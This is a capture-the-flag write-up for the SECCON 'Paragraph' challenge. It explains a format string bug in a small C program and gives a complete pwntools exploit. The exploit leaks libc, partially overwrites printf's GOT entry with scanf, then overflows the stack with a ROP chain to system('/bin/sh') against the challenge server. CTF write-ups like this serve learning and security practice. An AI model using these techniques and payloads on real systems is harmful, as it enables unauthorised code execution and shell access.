# Paragraph

The program is extremely small:

```c
#include <stdio.h>

int main() {
  char name[24];
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  printf("\"What is your name?\", the black cat asked.\n");
  scanf("%23s", name);
  printf(name);
  printf(" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted %s warmly.\n", name);

  return 0;
}
```
It is compiled without PIE, without stack canaries, and with partial RELRO.

There is an obvious FSB in the second printf. The question is just, how to abuse it.
We can use the FSB to leak a libc address and also overwrite `printf@got` to redirect the last function call in the program.

We overwrite `printf` with `scanf`. The final call, now `scanf`, can be abused to cause a buffer overflow. 

Luckily `printf` and `__isoc99_scanf` are very close in libc:
```c
$3 = {<text variable, no debug info>} 0x78bffc2a10f0 <printf>
$4 = {<text variable, no debug info>} 0x78bffc2a0e00 <__isoc99_scanf>
```

Thus, by only overwriting 2 bytes, we have a `1/16` chance of overwriting `printf` with `scanf`.

If this succeeds, we can read too much data into the `name` variable to overwrite the return address. We then simly use a `system("/bin/sh")` ROP chain to get a shell.

The final exploit script:
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'chall')

host = args.HOST or 'paragraph.seccon.games'
#host = args.HOST or '127.0.0.1'

port = int(args.PORT or 5000)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b* 0x404100
continue
'''.format(**locals())

# -- Exploit goes here --

'''
# used to leak pointers and determine initial offset for %n attack
for i in range(40):
    io = start()
    print("Trying %d" % i)
    io.sendline(f'AAAABBBB.%{i}$p')
    print(io.recvall())
    io.close()
'''

libc = ELF('libc.so.6')
while True:
    try:
        io = start()
        
        # overwrite printf with scanf
        '''
        $3 = {<text variable, no debug info>} 0x78bffc2a10f0 <printf>
        $4 = {<text variable, no debug info>} 0x78bffc2a0e00 <__isoc99_scanf>
        '''

        payload = b'%33$p%3570c%8$hn' + p64(exe.got.printf)
        payload = payload[:-1]
        
        
        io.send(payload)
        io.recvuntil(b'asked.\n')
        leak = io.recv(14)
        log.info(f'Leaked ld address: {leak}')
        # libc offset 0x24f2e0 on remote
        libc.address = int(leak, 16) - 0x24f2e0
        log.info(f'libc base address: {hex(libc.address)}')
        
        time.sleep(1)
        
        rop = ROP(libc)
        rop.raw(rop.find_gadget(['ret']))
        rop.system(next(libc.search(b'/bin/sh\x00')))
        log.info(f'ROP chain: {rop.dump()}')
        
        payload2 = b' answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted'
        payload2 += b'A'*40 + rop.chain()
        io.sendline(payload2) 
        # there is some bug in my script, so I just send it twice. Probably missing a newline somewhere
        io.sendline(payload2)
        
        io.sendline(b'ls -al')
        print(io.recv(10))
        
        io.interactive()
    except EOFError:
        io.close()
        pass
```

